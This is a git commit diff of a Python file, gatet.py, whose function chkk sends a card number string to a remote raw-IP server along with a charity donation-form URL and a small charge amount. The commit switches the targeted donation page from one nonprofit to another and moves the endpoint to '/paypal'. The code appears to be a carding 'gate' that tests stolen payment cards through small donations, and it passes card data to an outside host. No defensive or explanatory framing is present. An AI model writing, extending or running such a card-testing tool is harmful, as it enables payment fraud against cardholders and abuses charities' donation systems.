21f3470c6617cf39e1e16218baa96f441c032b31
maxcdavid77-max <maxcdavid77@gmail.com>
2026-03-24 10:51:56 +0600

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -1,7 +1,7 @@
 import requests
 def chkk(ccx):
 	cc=ccx.strip()
-	urll="https://nkomo.org/donation-page/"
-	price="0.50"
-	res=requests.get(f'http://151.247.197.54:5000/tome?cc={cc}&url={urll}&price={0.50}').text
+	urll="https://hopeblooms.org/donations/donation-form/"
+	price="1"
+	res=requests.get(f'http://151.247.197.54:5500/paypal?cc={cc}&url={urll}&price={price}').text
 	return res
